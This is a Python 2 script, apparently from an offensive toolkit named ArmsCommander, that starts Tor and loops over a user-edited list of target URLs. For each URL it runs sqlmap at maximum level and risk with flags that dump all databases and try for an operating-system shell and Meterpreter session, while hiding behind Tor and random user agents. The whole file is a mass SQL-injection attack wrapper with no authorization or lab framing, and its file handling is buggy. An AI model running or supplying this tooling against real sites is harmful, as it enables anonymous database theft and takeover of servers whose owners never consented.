#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
import sys
import toolkits

os.chdir("/root/ArmsCommander/recon/sqlmap_improvement_project/")
wordlist = "/root/ArmsCommander/recon/sqlmap_improvement_project/target_list"
print toolkits.red("Starting up Tor Service")
os.system("gnome-terminal -e 'bash -c \"tor; exec bash\"'")
def get_db_list(target_str):

    cmd_str = """sqlmap -u "{0}" -v 6 --tor --check-tor --level=5 --risk=3 --batch --dbs -a -b --dump-all --os-shell --os-pwn --random-agent
    """.format(
        str(target_str)
    )
    print 'DEBUG: %s' % cmd_str

    os.system(cmd_str.strip())
    return
def read_target_list(wordlist):
    list_of_strings = "{0}".format(
        str(wordlist)
    )
    r = open(list_of_strings,'r')
    # line = r.readline()
    row_number = 1

    r = open(list_of_strings,'a+')
    with open(list_of_strings,'a+') as r:
        line = r.readline()
        sentence = str(line.strip())
        row_number = 1
        for sentence in r:
            if sentence != "":
                try:
                    target_str = sentence.strip()
                    print 'DEBUG: %s' % target_str
                    get_db_list(target_str)
                except:
                    print toolkits.yellow("All target possible databases scanned")

    return
def edit_wordlist():
    os.chdir('/root/ArmsCommander/recon/sqlmap_improvement_project')
    os.system('echo "" > target_list')
    os.system("leafpad target_list")
    return
def main():
    print toolkits.yellow("""
    SQLMAP OPTIONS:

    \tLIST: Get a database list of the target URL (or URLs)
    \tEDIT: Edit the wordlist of targeted URLs
    \tEXIT: Exit program
    """)

    opt_choice = str(raw_input(toolkits.yellow("Enter a COMMAND: ")))

    if opt_choice == "LIST":
        os.system('clear')
        read_target_list(wordlist)
        main()
    elif opt_choice == "EDIT":
        os.system('clear')
        edit_wordlist()
        main()
    elif opt_choice == "EXIT":
        exit(0)
    else:
        os.system('clear')
        print toolkits.red("You have entered a invalid option")
        main()
    return
main()
